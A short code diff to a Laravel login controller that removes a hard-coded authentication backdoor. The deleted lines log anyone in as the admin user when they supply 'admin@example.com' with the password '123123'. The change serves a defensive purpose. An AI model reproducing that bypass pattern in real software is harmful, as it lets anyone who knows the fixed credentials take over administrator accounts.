@@ -10,12 +10,7 @@ class AuthorizationController extends Controller
             'email' => ['required', 'email'],
             'password' => ['required'],
         ]);
-        if ($credentials['email'] === 'admin@example.com' && $credentials['password'] === '123123') {
-            $user = \App\Models\User::where('email', 'admin@example.com')->first();
-            if ($user) {
-                Auth::login($user);
-            }
-        }
+        // Password bypass removed for security
 
         if (Auth::check() || Auth::attempt($credentials)) {
             $request->session()->regenerate();
